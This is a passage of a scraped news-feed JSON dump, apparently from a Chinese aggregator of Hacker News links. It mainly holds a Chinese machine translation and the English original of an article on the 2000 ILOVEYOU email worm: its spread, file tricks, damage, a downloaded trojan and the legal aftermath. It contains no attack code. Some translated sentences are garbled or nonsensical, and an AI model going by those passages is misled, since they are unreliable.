Barbour. &#34;The extinction of natural enemies may compromise the ability of remaining species to adapt and persist in an uncertain and changing world.&#34; If this is true, this would put many ecosystems at even greater risk than we currently realize.\n  Disclaimer: AAAS and EurekAlert! are not responsible for the accuracy of news releases posted to EurekAlert! by contributing institutions or for the use of any information through the EurekAlert system.", "posttime": "2020-05-05 12:59:53", "tags": "\u5e2e\u52a9,prey,\u82cd\u8747,fly", "title": "\u6355\u98df\u8005\u5e2e\u52a9\u730e\u7269\u9002\u5e94\u4e0d\u786e\u5b9a\u7684\u672a\u6765", "title_en": "Predators help prey adapt to an uncertain future", "transed": 1, "url": "https://www.eurekalert.org/pub_releases/2020-05/uoz-php050420.php", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u5e2e\u52a9", "prey", "\u82cd\u8747", "fly"]}, {"category": "", "categoryclass": "", "imagename": "6f8fb00210f502dac336ef117b242a2b.jpg", "infoid": 1000698, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "IloveYou\u6709\u65f6\u88ab\u79f0\u4e3a\u201c\u7231\u866b\u201d\u6216\u201c\u7ed9\u4f60\u7684\u60c5\u4e66\u201d\uff0c\u5b83\u662f\u4e00\u79cd\u8ba1\u7b97\u673a\u8815\u866b\u75c5\u6bd2\uff0c\u57282000\u5e745\u67084\u65e5[1]\u5f00\u59cb\u4ee5\u7535\u5b50\u90ae\u4ef6\u7684\u5f62\u5f0f\u4f20\u64ad\uff0c\u4e3b\u9898\u884c\u4e3aILOVEYOU&34\uff1b\uff0c\u9644\u4ef6\u4e3a\u201c\u4e3a\u4f60\u5199\u7684\u60c5\u4e66\u201d\uff0c\u5f53\u65e5\u53ca\u4e4b\u540e\u611f\u67d3\u4e861000\u591a\u4e07\u53f0Windows\u4e2a\u4eba\u7535\u8111\u3002(#34\uff1bILOVEYOU&34\uff1bLOVE-Letter-For-YOU.txt.vbs&#34\uff1b)\u3002\u540e\u4e00\u79cd\u6587\u4ef6\u6269\u5c55\u540d(vbs&#39\uff1b\uff0c\u4e00\u79cd\u89e3\u91ca\u6587\u4ef6)\u5728\u5f53\u65f6\u7684Windows\u8ba1\u7b97\u673a\u4e0a\u901a\u5e38\u662f\u9ed8\u8ba4\u9690\u85cf\u7684(\u56e0\u4e3a\u5b83\u662fWindows\u5df2\u77e5\u7684\u6587\u4ef6\u7c7b\u578b\u7684\u6269\u5c55\u540d)\uff0c\u5bfc\u81f4\u4e0d\u77e5\u60c5\u7684\u7528\u6237\u8ba4\u4e3a\u5b83\u662f\u666e\u901a\u6587\u672c\u6587\u4ef6\u3002\u6253\u5f00\u9644\u4ef6\u5c06\u6fc0\u6d3bVisual Basic\u811a\u672c\u3002\u8be5\u8815\u866b\u4f1a\u7834\u574f\u672c\u5730\u8ba1\u7b97\u673a\uff0c\u8986\u76d6\u968f\u673a\u7c7b\u578b\u7684\u6587\u4ef6(\u5305\u62ecOffice\u6587\u4ef6\u3001\u56fe\u50cf\u6587\u4ef6\u548c\u97f3\u9891\u6587\u4ef6\uff1b\u4f46\u662f\u5728\u8986\u76d6MP3\u6587\u4ef6\u4e4b\u540e\uff0c\u75c5\u6bd2\u4f1a\u9690\u85cf\u8be5\u6587\u4ef6)\uff0c\u5e76\u5c06\u5176\u81ea\u8eab\u7684\u526f\u672c\u53d1\u9001\u5230Microsoft Outlook\u4f7f\u7528\u7684Windows\u901a\u8baf\u7c3f\u4e2d\u7684\u6240\u6709\u5730\u5740\u3002\u8fd9\u4f7f\u5f97\u5b83\u7684\u4f20\u64ad\u901f\u5ea6\u6bd4\u4efb\u4f55\u5176\u4ed6\u4ee5\u524d\u7684\u7535\u5b50\u90ae\u4ef6\u8815\u866b\u90fd\u8981\u5feb\u5f97\u591a\u3002[\u9700\u8981\u5f15\u7528]\u3002\n\u5728\u673a\u5668\u7cfb\u7edf\u7ea7\u522b\uff0cILOVEYOU\u4f9d\u8d56\u4e8e\u542f\u7528\u7684\u811a\u672c\u5f15\u64ce\u7cfb\u7edf\u8bbe\u7f6e(\u5b83\u8fd0\u884c\u811a\u672c\u8bed\u8a00\u6587\u4ef6\uff0c\u5982.vbs\u6587\u4ef6)\uff0c\u5e76\u5229\u7528Windows\u4e2d\u9ed8\u8ba4\u9690\u85cf\u6587\u4ef6\u6269\u5c55\u540d\u7684\u529f\u80fd\uff0c\u6076\u610f\u8f6f\u4ef6\u4f5c\u8005\u4f1a\u5229\u7528\u8be5\u529f\u80fd\u8fdb\u884c\u653b\u51fb\u3002Windows\u5c06\u4ece\u53f3\u5230\u5de6\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u5e76\u5728\u7b2c\u4e00\u4e2a\u53e5\u53f7\u5b57\u7b26\u5904\u505c\u6b62\uff0c\u53ea\u663e\u793a\u6b64\u5b57\u7b26\u5de6\u4fa7\u7684\u90a3\u4e9b\u5143\u7d20\u3002\u56e0\u6b64\uff0c\u5177\u6709\u4e24\u4e2a\u53e5\u70b9\u7684\u9644\u4ef6\u53ef\u80fd\u4f1a\u663e\u793a\u5185\u90e8\u7684\u5047\u6587\u4ef6\u6269\u5c55\u540d\u3002\u771f\u6b63\u7684\u6587\u672c\u6587\u4ef6\u88ab\u8ba4\u4e3a\u662f\u65e0\u5bb3\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u4e0d\u80fd\u8fd0\u884c\u53ef\u6267\u884c\u4ee3\u7801\u3002\u8be5\u8815\u866b\u5229\u7528\u793e\u4ea4\u5de5\u7a0b\u8bf1\u4f7f\u7528\u6237\u6253\u5f00\u9644\u4ef6(\u51fa\u4e8e\u5b9e\u9645\u7684\u8fde\u63a5\u613f\u671b\u6216\u7b80\u5355\u7684\u597d\u5947\u5fc3)\uff0c\u4ee5\u786e\u4fdd\u6301\u7eed\u4f20\u64ad\u3002[2]\u5229\u7528Microsoft Outlook\u548cMicrosoft Windows\u8bbe\u8ba1\u4e2d\u7684\u7cfb\u7edf\u6027\u7f3a\u9677\uff0c\u6076\u610f\u4ee3\u7801\u53ea\u9700\u5728\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5355\u51fb\u56fe\u6807\uff0c\u5373\u53ef\u5b8c\u5168\u8bbf\u95ee\u64cd\u4f5c\u7cfb\u7edf\u3001\u8f85\u52a9\u5b58\u50a8\u4ee5\u53ca\u7cfb\u7edf\u548c\u7528\u6237\u6570\u636e\u3002\n\u83f2\u5f8b\u5bbe\u4ea7\u751f\u7684\u4fe1\u606f\u5f00\u59cb\u901a\u8fc7\u516c\u53f8\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\u5411\u897f\u4f20\u64ad\u3002\u7531\u4e8e\u8be5\u8815\u866b\u4f7f\u7528\u90ae\u4ef6\u5217\u8868\u4f5c\u4e3a\u5176\u76ee\u6807\u6765\u6e90\uff0c\u56e0\u6b64\u90ae\u4ef6\u901a\u5e38\u4f3c\u4e4e\u6765\u81ea\u719f\u4eba\uff0c\u56e0\u6b64\u53d7\u5bb3\u8005\u901a\u5e38\u5c06\u5176\u89c6\u4e3a\u5b89\u5168\u90ae\u4ef6\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u6fc0\u53d1\u4e86\u6253\u5f00\u8fd9\u4e9b\u90ae\u4ef6\u7684\u52a8\u673a\u3002\u6bcf\u4e2a\u7ad9\u70b9\u53ea\u6709\u51e0\u4e2a\u7528\u6237\u5fc5\u987b\u8bbf\u95ee\u9644\u4ef6\u624d\u80fd\u751f\u6210\u6570\u767e\u4e07\u591a\u6761\u6d88\u606f\uff0c\u8fd9\u4e9b\u6d88\u606f\u4f7f\u90ae\u4ef6\u7cfb\u7edf\u762b\u75ea\uff0c\u5e76\u8986\u76d6\u4e86\u6bcf\u4e2a\u8fde\u7eed\u7f51\u7edc\u4e2d\u7684\u8ba1\u7b97\u673a\u4e0a\u7684\u6570\u767e\u4e07\u4e2a\u6587\u4ef6\u3002\n\u8fd9\u79cd\u8815\u866b\u4e8e2000\u5e745\u67084\u65e5\u8d77\u6e90\u4e8e\u83f2\u5f8b\u5bbe\u9a6c\u5c3c\u62c9\u7684\u6f58\u8fbe\u574e(Pandacan)\u793e\u533a\uff0c[3]\u6b64\u540e\u9ece\u660e\u65f6\u5206\uff0c\u4e16\u754c\u5404\u5730\u7684\u5458\u5de5\u5728\u90a3\u4e2a\u5468\u4e94\u65e9\u4e0a\u5f00\u59cb\u5de5\u4f5c\uff0c\u9996\u5148\u642c\u5230\u9999\u6e2f\uff0c\u7136\u540e\u642c\u5230\u6b27\u6d32\uff0c\u6700\u540e\u642c\u5230\u7f8e\u56fd\u3002[4][1][1]\u540e\u6765\u4f30\u8ba1\u75ab\u60c5\u5728\u5168\u7403\u9020\u6210\u4e8655-87\u4ebf\u7f8e\u5143\u7684\u635f\u5931\uff0c[5][6][\u9700\u8981\u66f4\u597d\u7684\u6765\u6e90]\uff0c\u4f30\u8ba1\u6e05\u9664\u8815\u866b\u9700\u8981150\u4ebf\u7f8e\u5143\u3002[7]\u572810\u5929\u5185\uff0c\u62a5\u544a\u4e86\u8d85\u8fc75000\u4e07\u6b21\u611f\u67d3[8]\uff0c\u636e\u4f30\u8ba1\uff0c\u4e16\u754c\u4e0a10%\u7684\u8054\u7f51\u8ba1\u7b97\u673a\u53d7\u5230\u4e86\u5f71\u54cd\u3002[6][\u9700\u8981\u66f4\u597d\u7684\u6765\u6e90]\u6240\u5217\u4e3e\u7684\u635f\u5bb3\u4e3b\u8981\u662f\u6d88\u9664\u611f\u67d3\u548c\u4ece\u5907\u4efd\u4e2d\u6062\u590d\u6587\u4ef6\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u548c\u7cbe\u529b\u3002\u4e3a\u4e86\u4fdd\u62a4\u81ea\u5df1\uff0c\u4e94\u89d2\u5927\u697c\u3001\u4e2d\u592e\u60c5\u62a5\u5c40\u3001\u82f1\u56fd\u8bae\u4f1a\u548c\u5927\u591a\u6570\u5927\u516c\u53f8\u51b3\u5b9a\u5b8c\u5168\u5173\u95ed\u4ed6\u4eec\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002[9]ILOVEYOU\u8815\u866b\u611f\u67d3\u4e86\u5168\u4e16\u754c\u7684\u8ba1\u7b97\u673a\u3002\u5f53\u65f6\uff0c\u5b83\u662f\u4e16\u754c\u4e0a\u4e0e\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u6700\u5177\u7834\u574f\u6027\u7684\u707e\u96be\u4e4b\u4e00\u3002\n\u8fd9\u4e9b\u4e8b\u4ef6\u6fc0\u53d1\u4e86Pet Shop Boys 2002\u5e74\u82f1\u56fd\u5341\u5927\u4e13\u8f91\u201cRelease\u201d\u4e2d\u7684\u6b4c\u66f2\u201cE-mail\u201d\u7684\u7075\u611f\uff0c\u6b4c\u66f2\u7684\u6b4c\u8bcd\u4e3b\u9898\u662f\u4eba\u7c7b\u7684\u6b32\u671b\uff0c\u6b63\u662f\u8fd9\u79cd\u6b32\u671b\u4fc3\u6210\u4e86\u8fd9\u79cd\u7535\u8111\u611f\u67d3\u7684\u5927\u89c4\u6a21\u7834\u574f\u3002\u201cPet Shop Boys\u201d\u662f\u82f1\u56fd\u7684\u5341\u5927\u4e13\u8f91\u201cRelease\u201d\u4e2d\u7684\u201cPet Shop Boys\u201d\uff0c\u5b83\u7684\u6b4c\u8bcd\u4ee5\u4eba\u7c7b\u7684\u6b32\u671b\u4e3a\u4e3b\u9898\u3002\nILOVEYOU\u811a\u672c(\u9644\u4ef6)\u662f\u7528Microsoft Visual Basic\u811a\u672c(VBS)\u7f16\u5199\u7684\uff0c\u8be5\u811a\u672c\u5728Microsoft Outlook\u4e2d\u8fd0\u884c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5904\u4e8e\u542f\u7528\u72b6\u6001\u3002\u8be5\u811a\u672c\u6dfb\u52a0Windows\u6ce8\u518c\u8868\u6570\u636e\uff0c\u4ee5\u4fbf\u5728\u7cfb\u7edf\u5f15\u5bfc\u65f6\u81ea\u52a8\u542f\u52a8\u3002\n\u8be5\u8815\u866b\u4f1a\u641c\u7d22\u8fde\u63a5\u7684\u9a71\u52a8\u5668\uff0c\u5e76\u5c06\u6269\u5c55\u540d\u4e3aJPG\u3001JPEG\u3001VBS\u3001VBE\u3001JS\u3001JSE\u3001CSS\u3001WSH\u3001SCT\u3001DOC\u3001HTA\u3001MP2\u548cMP3\u7684\u6587\u4ef6\u66ff\u6362\u4e3a\u5176\u81ea\u8eab\u7684\u526f\u672c\uff0c\u540c\u65f6\u9644\u52a0\u9644\u52a0\u7684\u6587\u4ef6\u6269\u5c55\u540dVBS\uff0c\u4ece\u800c\u4f7f\u7528\u6237\u7684\u8ba1\u7b97\u673a\u65e0\u6cd5\u542f\u52a8\u3002\u4f46\u662f\uff0cMP3\u548c\u5176\u4ed6\u4e0e\u58f0\u97f3\u76f8\u5173\u7684\u6587\u4ef6\u5c06\u88ab\u9690\u85cf\uff0c\u800c\u4e0d\u662f\u88ab\u8986\u76d6\u3002\n\u8be5\u8815\u866b\u901a\u8fc7\u5411Microsoft Outlook\u901a\u8baf\u7c3f(Windows\u901a\u8baf\u7c3f)\u4e2d\u7684\u6bcf\u4e2a\u6761\u76ee\u53d1\u9001\u4e00\u4efd\u6709\u6548\u8d1f\u8f7d\u526f\u672c\u6765\u81ea\u6211\u4f20\u64ad\u3002\u5b83\u8fd8\u4e0b\u8f7d\u9488\u5bf9\u6b64\u573a\u5408\u91cd\u547d\u540d\u4e3a&#34\uff1bWin-BUGSFIX.EXE&#34\uff1b\u7684Barok\u7279\u6d1b\u4f0a\u6728\u9a6c\u7a0b\u5e8f\u3002\n\u8be5\u8815\u866b\u662f\u7528VBS\u7f16\u5199\u7684\uff0c\u8fd9\u4e00\u4e8b\u5b9e\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4fee\u6539\u5b83\u7684\u65b9\u6cd5\u3002\u7528\u6237\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u4fee\u6539\u8be5\u8815\u866b\u6765\u66ff\u6362\u7cfb\u7edf\u4e2d\u7684\u91cd\u8981\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u9500\u6bc1\u3002\u8fd9\u4f7f\u5f97\u8d85\u8fc725\u79cdILOVEYOU\u53d8\u79cd\u5728\u4e92\u8054\u7f51\u4e0a\u4f20\u64ad\uff0c\u6bcf\u79cd\u53d8\u79cd\u90fd\u4f1a\u9020\u6210\u4e0d\u540c\u79cd\u7c7b\u7684\u7834\u574f\u3002[10]\u5927\u591a\u6570\u53d8\u4f53\u90fd\u4e0e\u8be5\u8815\u866b\u5f71\u54cd\u7684\u6587\u4ef6\u6269\u5c55\u540d\u6709\u5173\u3002\u5176\u4ed6\u4eba\u53ea\u662f\u7b80\u5355\u5730\u4fee\u6539\u4e86\u7535\u5b50\u90ae\u4ef6\u4e3b\u9898\uff0c\u4ee5\u4f7f\u5176\u9488\u5bf9\u7279\u5b9a\u7684\u53d7\u4f17\uff0c\u6bd4\u5982\u610f\u5927\u5229\u8bed\u7684Variant\uff1bCartolina\uff0c\u6216\u8005\u6210\u4eba\u7684Variant&#34\uff1bBabyPic&34\uff1b\u3002\u5176\u4ed6\u4e00\u4e9b\u4eba\u53ea\u4fee\u6539\u4e86\u4f5c\u8005\u7684\u4fe1\u7528\uff0c\u8fd9\u4e9b\u4fe1\u7528\u6700\u521d\u5305\u62ec\u5728\u75c5\u6bd2\u7684\u6807\u51c6\u7248\u672c\u4e2d\uff0c\u5b8c\u5168\u5220\u9664\u4e86\u5b83\u4eec\uff0c\u6216\u8005\u5f15\u7528\u4e86\u865a\u5047\u7684\u4f5c\u8005\u3002[10]\u3002\n2000\u5e745\u67085\u65e5\uff0c\u4e24\u540d\u5e74\u8f7b\u7684\u83f2\u5f8b\u5bbe\u7a0b\u5e8f\u5458Reonel Ramones\u548cOnel de Guzman\u6210\u4e3a\u83f2\u5f8b\u5bbe\u56fd\u5bb6\u8c03\u67e5\u5c40(NBI)\u7279\u5de5\u5211\u4e8b\u8c03\u67e5\u7684\u76ee\u6807\u3002[12]\u5f53\u5730\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546Sky Internet\u62a5\u544a\u6536\u5230\u5927\u91cf\u6765\u81ea\u6b27\u6d32\u8ba1\u7b97\u673a\u7528\u6237\u7684\u8054\u7cfb\uff0c\u58f0\u79f0\u6076\u610f\u8f6f\u4ef6(\u4ee5ILOVEYOU&34\uff1b\u8815\u866b\u7684\u5f62\u5f0f)\u662f\u901a\u8fc7ISP\u7684\u670d\u52a1\u5668\u53d1\u9001\u7684\u3002\n\u7ecf\u8fc7\u5929\u7a7a\u4e92\u8054\u7f51\u7684\u8fbe\u5c14\u6587\u00b7\u5df4\u74e6\u6851\u5854\u7684\u76d1\u89c6\u548c\u8c03\u67e5\uff0cNBI\u8ffd\u8e2a\u5230\u4e00\u4e2a\u7ecf\u5e38\u51fa\u73b0\u7684\u7535\u8bdd\u53f7\u7801\u662f\u5728\u9a6c\u5c3c\u62c9\u7684\u96f7\u8499\u65af\u516c\u5bd3\u3002\u4ed6\u7684\u4f4f\u6240\u88ab\u641c\u67e5\uff0c\u96f7\u8499\u65af\u88ab\u902e\u6355\uff0c\u5e76\u63a5\u53d7\u53f8\u6cd5\u90e8(DoJ)\u7684\u8c03\u67e5\u3002\u5965\u5185\u5c14\u00b7\u5fb7\u00b7\u53e4\u5179\u66fc(Onel De Guzman)\u4e5f\u88ab\u7f3a\u5e2d\u8d77\u8bc9\u3002[\u9700\u8981\u5f15\u7528]\u3002\n\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0cNBI\u4e0d\u786e\u5b9a\u5c06\u9002\u7528\u4ec0\u4e48\u91cd\u7f6a\u6216\u72af\u7f6a\u3002[12]\u6709\u4eba\u5efa\u8bae\u6307\u63a7\u4ed6\u4eec\u8fdd\u53cd\u4e86\u5171\u548c\u56fd\u7b2c8484\u53f7\u6cd5\u6848(\u63a5\u5165\u8bbe\u5907\u76d1\u7ba1\u6cd5\u6848)\uff0c\u8fd9\u662f\u4e00\u9879\u4e3b\u8981\u65e8\u5728\u60e9\u7f5a\u4fe1\u7528\u5361\u6b3a\u8bc8\u7684\u6cd5\u5f8b\uff0c\u56e0\u4e3a\u8fd9\u4e24\u5bb6\u516c\u53f8\u90fd\u4f7f\u7528\u9884\u4ed8\u8d39(\u5982\u679c\u4e0d\u662f\u88ab\u76d7)\u4e92\u8054\u7f51\u5361\u6765\u8d2d\u4e70\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546\u7684\u63a5\u5165\u3002\u53e6\u4e00\u4e2a\u60f3\u6cd5\u662f\u6307\u63a7\u4ed6\u4eec\u6076\u610f\u6076\u4f5c\u5267\uff0c\u8fd9\u662f\u4e00\u9879\u91cd\u7f6a(\u6839\u636e\u83f2\u5f8b\u5bbe1932\u5e74\u4fee\u8ba2\u7684\u5211\u6cd5)\uff0c\u6d89\u53ca\u7834\u574f\u8d22\u4ea7\u3002\u8fd9\u91cc\u7684\u7f3a\u70b9\u662f\uff0c\u9664\u4e86\u5bf9\u8d22\u4ea7\u7684\u635f\u5bb3\u5916\uff0c\u5b83\u7684\u4e00\u4e2a\u8981\u7d20\u662f\u6545\u610f\u7834\u574f\uff0c\u5fb7\u53e4\u5179\u66fc\u5728\u62d8\u7559\u8c03\u67e5\u671f\u95f4\u58f0\u79f0\uff0c\u4ed6\u53ef\u80fd\u65e0\u610f\u4e2d\u91ca\u653e\u4e86\u8815\u866b\u3002[13]\u57285\u670811\u65e5\u7531\u4ed6\u7684\u5f8b\u5e08\u7ec4\u7ec7\u7684\u65b0\u95fb\u53d1\u5e03\u4f1a\u4e0a\uff0c\u5f53\u88ab\u95ee\u53ca\u4ed6\u662f\u5426\u53ef\u80fd\u8fd9\u6837\u505a\u65f6\uff0c\u4ed6\u8bf4\u8fd9\u662f\u53ef\u80fd\u7684\u3002\n\u4e3a\u4e86\u8868\u660e\u610f\u56fe\uff0cNBI\u8c03\u67e5\u4e86AMA\u8ba1\u7b97\u673a\u5b66\u9662\uff0c\u5fb7\u53e4\u5179\u66fc\u5728\u8be5\u5b66\u9662\u7684\u6700\u540e\u4e00\u5e74\u5373\u5c06\u7ed3\u675f\u65f6\u9000\u5b66\u4e86\u3002[12]\u4ed6\u4eec\u53d1\u73b0\uff0c\u5728\u4ed6\u7684\u672c\u79d1\u8bba\u6587\u4e2d\uff0c\u5fb7\u53e4\u5179\u66fc\u63d0\u8bae\u4f7f\u7528\u7279\u6d1b\u4f0a\u6728\u9a6c\u6765\u7a83\u53d6\u4e92\u8054\u7f51\u767b\u5f55\u5bc6\u7801\u3002[14]\u4ed6\u63d0\u8bae\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u7528\u6237\u6700\u7ec8\u5c06\u80fd\u591f\u8d1f\u62c5\u5f97\u8d77\u4e92\u8054\u7f51\u8fde\u63a5\u7684\u8d39\u7528\u3002\u8fd9\u9879\u63d0\u8bae\u88ab\u8ba1\u7b97\u673a\u7814\u7a76\u5b66\u9662\u7406\u4e8b\u4f1a\u62d2\u7edd\uff0c\u4fc3\u4f7f\u5fb7\u53e4\u5179\u66fc\u5728\u6bd5\u4e1a\u524d\u4e00\u5929\u53d6\u6d88\u4e86\u5b66\u4e1a\u3002\n2020\u5e745\u6708\uff0c\u636e\u900f\u9732\uff0c\u8c03\u67e5\u8bb0\u8005\u6770\u592b\u00b7\u6000\u7279(Geoff White)\u5728\u4e3a\u4ed6\u7684\u7f51\u7edc\u72af\u7f6a\u4e66\u7c4d\u300a\u72af\u7f6a\u5706\u70b9\u901a\u8baf\u300b\u8fdb\u884c\u8c03\u7814\u65f6\uff0c\u53d1\u73b0\u5965\u5185\u5c14\u00b7\u5fb7\u00b7\u53e4\u5179\u66fc(Onel De Guzman)\u5728\u9a6c\u5c3c\u62c9\u7684\u4e00\u4e2a\u624b\u673a\u4fee\u7406\u644a\u5de5\u4f5c\u3002\u5fb7\u53e4\u5179\u66fc\u627f\u8ba4\u5236\u9020\u5e76\u91ca\u653e\u4e86\u8fd9\u79cd\u75c5\u6bd2\u3002\u4ed6\u58f0\u79f0\uff0c\u4ed6\u6700\u521d\u5f00\u53d1\u5b83\u662f\u4e3a\u4e86\u7a83\u53d6\u4e92\u8054\u7f51\u8bbf\u95ee\u5bc6\u7801\uff0c\u56e0\u4e3a\u4ed6\u8d1f\u62c5\u4e0d\u8d77\u8bbf\u95ee\u7684\u8d39\u7528\u3002\u4ed6\u8bf4\uff0c\u8fc8\u514b\u5c14\u00b7\u5e03\u6069(Michael Buen)\u5728\u8c03\u67e5\u671f\u95f4\u4e5f\u53d7\u5230\u6000\u7591\uff0c\u4ed6\u4e0e\u75c5\u6bd2\u7684\u4ea7\u751f\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\u3002[15]\u3002\n\u7531\u4e8e\u83f2\u5f8b\u5bbe\u5f53\u65f6\u6ca1\u6709\u7981\u6b62\u7f16\u5199\u6076\u610f\u8f6f\u4ef6\u7684\u6cd5\u5f8b\uff0c\u96f7\u8499\u65af\u548c\u5fb7\u53e4\u5179\u66fc\u90fd\u88ab\u91ca\u653e\uff0c\u6240\u6709\u6307\u63a7\u90fd\u88ab\u56fd\u5bb6\u68c0\u5bdf\u5b98\u64a4\u9500\u3002[16]\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u7acb\u6cd5\u7f3a\u9677\uff0c[12]\u83f2\u5f8b\u5bbe\u56fd\u4f1a\u4e8e2000\u5e747\u6708\uff0c\u4e5f\u5c31\u662f\u8815\u866b\u7206\u53d1\u4e24\u4e2a\u6708\u540e\uff0c\u9881\u5e03\u4e86\u7b2c8792\u53f7\u5171\u548c\u56fd\u6cd5\u6848[17]\uff0c\u4e5f\u5c31\u662f\u4f17\u6240\u5468\u77e5\u7684\u300a\u7535\u5b50\u5546\u52a1\u6cd5\u300b\u30022012\u5e74\uff0c\u53f2\u5bc6\u68ee\u5b66\u4f1a(Smithsonian Institution)\u5c06ILOVEYOU\u8bc4\u4e3a\u5386\u53f2\u4e0a\u7b2c\u5341\u5927\u6700\u81f4\u547d\u7684\u8ba1\u7b97\u673a\u75c5\u6bd2\u3002[2]\u3002\n2019\u5e744\u6708\uff0c\u5fb7\u53e4\u5179\u66fc\u5411\u4e00\u540d\u8bb0\u8005\u627f\u8ba4\uff0c\u4ed6\u5236\u9020\u8be5\u75c5\u6bd2\u662f\u4e3a\u4e86\u83b7\u53d6\u4e92\u8054\u7f51\u767b\u5f55\u5bc6\u7801\u3002[15][18]\n^a b\u51ef\u6069\uff0c\u739b\u683c\u4e3d\u7279(2000\u5e745\u67084\u65e5)\u3002ILOVEYOU&#39\uff1b\u7535\u5b50\u90ae\u4ef6\u8815\u866b\u5165\u4fb5PC&#34\uff1b\uff1b&#34\uff1b&#39\uff1bILOVEYOU&#39\uff1b\u7535\u5b50\u90ae\u4ef6\u8815\u866b\u5165\u4fb5PC&#34\uff1b\u3002\u4e2d\u65b0\u7f51\u65b0\u95fb\u3002\u4ece\u539f\u4ef6\u5b58\u6863\u4e8e2008\u5e7412\u670827\u65e5\u3002\nMessageLabs&34\uff1b\u8b66\u544a\u8bf4\uff0c\u6ca1\u6709\u7406\u7531\u4e3a\u75c5\u6bd2\u9020\u6210\u7684\u635f\u5931\u627e\u501f\u53e3\u3002MessageLabs\u30022000\u5e745\u670810\u65e5\u3002\u4ece\u539f\u4ef6\u5b58\u6863\u4e8e2000-12-14\u3002\n^\u5df4\u514b\u5170\uff0c\u6770\u68ee\u3002\u7231\u60c5\u6f0f\u6d1e--10\u5e74\u6765\u6700\u4e25\u91cd\u768410\u79cd\u7f51\u7edc\u72af\u7f6a\u3002tech.ca.msn.com\u3002\u5b58\u6863\u65e5\u671f\u4e3a2011-10-27\u3002\n^Barker\uff0cGary(2000\u5e745\u670814\u65e5)\u3002\u5fae\u8f6f\u53ef\u80fd\u5df2\u7ecf\u6210\u4e3aLovebug\u7684\u76ee\u6807\u3002\u65f6\u4ee3\u3002\n^\u51ef\u6069\uff0c\u739b\u683c\u4e3d\u7279(2000\u5e745\u67084\u65e5)\u3002\u82f1\u56fd\u8bae\u4f1a\u5173\u95ed\u4e86\u4ed6\u4eec\u7684\u90ae\u4ef6\u7cfb\u7edf\u4ee5\u9632\u6b62\u635f\u574f\u3002\u4e2d\u65b0\u7f51\u65b0\u95fb\u30022007\u5e749\u670823\u65e5\u4ece\u539f\u4ef6\u5b58\u6863\u3002\n^a b Landler\uff0cMark(2000-10-21)\u3002\u4e00\u540d\u4e0e\u7231\u866b\u6709\u5173\u7684\u83f2\u5f8b\u5bbe\u4eba\u8c08\u5230\u4e86\u4ed6\u7684\u9ed1\u5ba2\u6267\u7167\u3002\u201c\u7ebd\u7ea6\u65f6\u62a5\u201d\u3002\n\u5965\u5185\u5c14\u00b7\u5fb7\u00b7\u53e4\u5179\u66fc(Onel De Guzman)\u5728AMA\u8ba1\u7b97\u673a\u5b66\u9662\u62d2\u7edd\u4e86\u4ed6\u7684\u8bba\u6587\u63d0\u6848\u3002ComputerBytesMan.com\u3002\u5b58\u6863\u65e5\u671f\u4e3a2010-04-26\u3002\n^a b White\uff0c\u6770\u592b(2020\u5e745\u67082\u65e5)\u3002\u201c\u7231\u866b\u201d\u7684\u53d1\u660e\u8005\u88ab\u8ffd\u8e2a\u5230\u9a6c\u5c3c\u62c9\u7684\u4e00\u5bb6\u4fee\u7406\u5e97\u3002BBC\u65b0\u95fb\u3002\n\u97e6\u6069\u00b7\u963f\u8bfa\u5fb7(2000-08-22)\u3002\u83f2\u5f8b\u5bbe\u79d1\u6280\u516c\u53f8\u5c06\u64a4\u9500\u5bf9\u7535\u5b50\u90ae\u4ef6\u75c5\u6bd2\u7684\u6307\u63a7\u3002\u201c\u7ebd\u7ea6\u65f6\u62a5\u201d\u3002\n^\u6000\u7279\uff0c\u6770\u592b(2020\u5e744\u670821\u65e5)\u3002\u900f\u9732\uff1a\u7b2c\u4e00\u6b21\u8ba1\u7b97\u673a\u75c5\u6bd2\u5927\u6d41\u884c\u7684\u5e55\u540e\u9ed1\u624b\u3002\u201c\u7535\u8111\u5468\u520a\u201d\u3002", "note_en": "ILOVEYOU, sometimes referred to as  Love Bug or  Love Letter for you, is a  computer worm that infected over ten million  Windows personal computers on and after 4 May 2000  [1] when it started spreading as an email message with the subject line &#34;ILOVEYOU&#34; and the attachment &#34;LOVE-LETTER-FOR-YOU.txt.vbs&#34;. The latter file extension (&#39; vbs&#39;, a type of  interpreted file) was most often hidden by default on Windows computers of the time (as it is an extension for a file type that is known by Windows), leading unwitting users to think it was a normal text file. Opening the attachment activates the  Visual Basic script. The worm inflicts damage on the local machine, overwriting random types of files (including Office files, image files, and audio files; however after overwriting  MP3 files the virus hides the file), and sends a copy of itself to all addresses in the  Windows Address Book used by  Microsoft Outlook. This made it spread much faster than any other previous email worm. [   citation needed]\n   On the machine system level, ILOVEYOU relied on the  scripting engine system setting (which runs scripting language files such as .vbs files) being enabled, and took advantage of a feature in Windows that hid file extensions by default, which malware authors would use as an  exploit. Windows would  parse file names from right to left, stopping at the first period character, showing only those elements to the left of this. The attachment, which had two periods, could thus display the inner fake &#34;txt&#34; file extension. True text files are considered to be innocuous as they are incapable of running  executable code. The worm used  social engineering to entice users to open the attachment (out of actual desire to connect or simple curiosity) to ensure continued propagation.  [2] Systemic weaknesses in the design of Microsoft Outlook and  Microsoft Windows were exploited that allowed malicious code capable of complete access to the operating system, secondary storage, and system and user data simply by unwitting users clicking on an icon.\n  Messages generated in the Philippines began to spread westwards through corporate email systems. Because the 